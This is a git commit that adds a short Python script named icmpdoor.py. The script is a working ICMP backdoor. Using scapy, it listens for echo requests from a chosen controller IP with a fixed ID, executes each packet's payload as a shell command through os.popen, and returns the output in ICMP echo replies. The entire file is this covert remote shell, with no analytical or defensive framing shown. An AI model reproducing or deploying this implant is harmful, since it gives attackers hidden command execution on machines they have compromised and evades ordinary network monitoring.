cb755d9c0ad7546049d92028932d0dfba64c6ff7
Jeroen van Kessel <krabbedoelie@hotmail.com>
2020-11-14 11:32:36 +0100

    Update and rename client.py to icmpdoor.py

---
+++ icmpdoor.py
@@ -0,0 +1,23 @@
+#!/usr/bin/python3
+from scapy.all import *
+import argparse
+import os
+
+parser = argparse.ArgumentParser()
+parser.add_argument('-i', '--interface', type=str, required=True, help="(Virtual) Network Interface (e.g. eth0)")
+parser.add_argument('-d', '--destination_ip', type=str, required=True, help="Destination IP address")
+args = parser.parse_args()
+
+#Variables
+icmp_id = int(13170)
+
+def icmpshell(pkt):
+    if pkt[IP].src == args.destination_ip and pkt[ICMP].type == 8 and pkt[ICMP].id == icmp_id and pkt[Raw].load:
+        newpkt = (pkt[Raw].load).decode('utf-8', errors='ignore')
+        payload = os.popen(newpkt).readlines()
+        icmppacket = (IP(dst=args.destination_ip)/ICMP(type=0, id=icmp_id)/Raw(load=payload))
+        sr(icmppacket, timeout=0, verbose=0)
+    else:
+        pass
+    
+sniff(iface=args.interface, prn=icmpshell, filter="icmp", store="0")
